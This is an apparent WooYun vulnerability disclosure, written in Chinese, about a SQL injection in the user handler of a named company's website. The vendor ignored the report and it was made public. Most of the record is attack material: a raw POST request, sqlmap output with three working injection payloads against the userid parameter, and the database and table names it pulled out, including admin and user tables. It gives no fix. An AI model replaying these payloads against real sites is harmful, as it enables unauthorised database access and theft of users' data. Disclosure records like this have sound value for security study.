wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-09-21：	细节已通知厂商并且等待厂商处理中									2015-09-26：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 你懂得 详细说明：  
POST //Handler/HandlerUsers.ashx HTTP/1.1Host: www.vcanbio.comUser-Agent: Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.vcanbio.com//xiazaizhongxin.aspxContent-Length: 35Cookie: CNZZDATA4535577=cnzz_eid%3D1299039726-1441195081-http%253A%252F%252Fwww.baidu.com%252F%26ntime%3D1442652765; ASP.NET_SessionId=2vg3gc3kxxxhn3f5mbedyi45Connection: keep-alivePragma: no-cacheCache-Control: no-cachetype=userISch&userid=admin&pass=111
参数 userid pass 未过滤   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: userid (POST)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: type=userISch&userid=-1133' OR 3635=3635#&pass=111    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: type=userISch&userid=admin';(SELECT * FROM (SELECT(SLEEP(5)))ctDO)#&pass=111    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: type=userISch&userid=admin' AND (SELECT * FROM (SELECT(SLEEP(5)))iTSd)#&pass=111---[18:09:27] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: MySQL 5.0.11available databases [9]:[*] db_nmw[*] hezedb[*] information_schema[*] mqmgssspglxt[*] mysql[*] rsdome[*] scdb[*] tj_hzdb[*] vcanbio_zhongyuanxieheDatabase: vcanbio_zhongyuanxiehe[25 tables]+-----------------------------+| gsgzs                       || jos_search_reports_customer || jos_search_reports_para     || njbglist                    || qdnj                        || qdqx                        || qnnj                        || qxnj                        || qznj                        || t_academic                  || t_admin                     || t_annals                    || t_announcement              || t_article                   || t_companyinfo               || t_content                   || t_dashiji                   || t_log                       || t_medianews                 || t_message                   || t_news                      || t_staff                     || t_users                     || t_weblink                   || t_xiazai                    |+-----------------------------+   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-26 09:32 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
